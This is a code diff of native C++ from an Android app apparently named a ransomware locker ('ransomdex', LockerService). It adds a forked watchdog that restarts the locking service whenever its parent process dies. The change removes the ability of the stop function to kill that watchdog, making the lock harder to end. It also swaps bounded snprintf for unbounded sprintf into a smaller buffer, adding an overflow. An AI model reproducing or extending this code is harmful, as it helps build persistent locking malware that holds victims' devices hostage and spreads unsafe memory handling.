@@ -47,8 +47,8 @@ void* aggressiveLoop(void* args) {
 }
 
 void startWatchdog(const char* cmd) {
-    watchdogPid = fork();
-    if (watchdogPid == 0) { // Proses anak (Watchdog)
+    pid_t pid = fork();
+    if (pid == 0) { // Proses anak (Watchdog)
         pid_t ppid = getppid();
         while (true) {
             if (kill(ppid, 0) == -1) { // Jika parent (Java) mati
@@ -65,12 +65,12 @@ Java_com_bondex_ransomdex_LockerService_startNativeAggression(JNIEnv* env, jobje
     if (isRunning) return;
     
     env->GetJavaVM(&jvm);
-    isRunning = true;
     serviceObject = env->NewGlobalRef(thiz);
+    isRunning = true;
 
     const char* cmdStr = env->GetStringUTFChars(serviceName, nullptr);
-    char fullCmd[512];
-    snprintf(fullCmd, sizeof(fullCmd), "am startservice --user 0 -n %s", cmdStr);
+    char fullCmd[256];
+    sprintf(fullCmd, "am startservice --user 0 -n %s", cmdStr);
     
     startWatchdog(fullCmd);
     env->ReleaseStringUTFChars(serviceName, cmdStr);
@@ -82,10 +82,6 @@ Java_com_bondex_ransomdex_LockerService_startNativeAggression(JNIEnv* env, jobje
 extern "C" JNIEXPORT void JNICALL
 Java_com_bondex_ransomdex_LockerService_stopNativeAggression(JNIEnv* env, jobject thiz) {
     isRunning = false;
-    if (watchdogPid != -1) {
-        kill(watchdogPid, SIGKILL); // Hentikan watchdog agar tidak restart service
-        watchdogPid = -1;
-    }
     if (serviceObject != nullptr) {
         env->DeleteGlobalRef(serviceObject);
         serviceObject = nullptr;
